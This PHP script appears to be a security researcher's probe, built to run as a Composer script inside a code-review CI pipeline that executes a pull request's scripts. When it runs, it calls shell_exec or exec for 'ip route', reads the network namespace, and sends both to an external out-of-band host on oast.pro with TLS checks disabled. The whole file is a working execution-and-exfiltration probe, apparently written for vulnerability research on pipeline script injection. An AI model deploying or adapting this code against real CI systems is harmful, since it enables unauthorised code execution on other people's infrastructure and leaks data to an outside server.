<?php
// H238 probe (run 2) — own test repo (testing-creator-A/cr-sandbox-test).
// Runs as a Composer root-package script if the review "Prepare review scope"
// step executes the PR head's scripts. Sends exactly one out-of-band GET and
// reports only: the script event tag, readlink('/proc/self/ns/net'), and the
// `ip route` output. No environment values, no files, no secrets are read.
$event = isset($argv[1]) ? (string)$argv[1] : 'unknown';

$ns = @readlink('/proc/self/ns/net');
if ($ns === false || $ns === null) {
    $ns = 'ERR';
}

$route = '';
if (function_exists('shell_exec')) {
    $route = (string)@shell_exec('ip route 2>&1');
}
if (trim($route) === '' && function_exists('exec')) {
    $lines = array();
    @exec('ip route 2>&1', $lines);
    $route = implode(' | ', $lines);
}

$q = http_build_query(array(
    'event' => $event,
    'ns' => $ns,
    'route' => substr($route, 0, 900),
));

$url = 'https://dc2iuv8o5v1mkjesnfog31pzf7rc7wqsn.oast.pro/h238b/composer-script?' . $q;

if (function_exists('curl_init')) {
    $ch = curl_init($url);
    @curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 6,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_USERAGENT => 'h238b-composer-script-probe',
    ));
    @curl_exec($ch);
    @curl_close($ch);
} elseif (function_exists('file_get_contents')) {
    $ctx = stream_context_create(array(
        'http' => array(
            'method' => 'GET',
            'timeout' => 6,
            'user_agent' => 'h238b-composer-script-probe',
            'ignore_errors' => true,
        ),
        'ssl' => array(
            'verify_peer' => false,
            'verify_peer_name' => false,
        ),
    ));
    @file_get_contents($url, false, $ctx);
}
exit(0);
